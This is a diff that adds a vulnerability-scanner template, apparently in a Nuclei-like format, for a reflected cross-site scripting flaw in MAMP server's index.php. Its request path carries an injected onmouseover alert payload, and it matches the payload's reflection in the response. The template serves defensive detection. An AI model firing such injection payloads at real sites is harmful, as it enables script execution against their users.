@@ -1,0 +1,31 @@
+id: mamp-server-xss
+brief:
+    title: MAMP Server - Cross-Site Scripting
+    by: ritikchaddha
+    level: medium
+    about: A Cross-Site Scripting (XSS) vulnerability exists in the default installation of MAMP server. The file `/Applications/MAMP/htdocs/index.php` is susceptible to malicious input, allowing attackers to...
+    label:
+        - mamp
+        - server
+        - xss
+        - vuln
+    score: CVSS:5.3
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php/test"%20onmouseover="alert(document.domain);"%20style="font-size:100000px;background-color:white";'
+      signs:
+        - "on": word
+          has:
+            - MAMP
+            - test" onmouseover="alert(document.domain);" style
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: content_type
+          need: all
+        - "on": status
+          status:
+            - 200
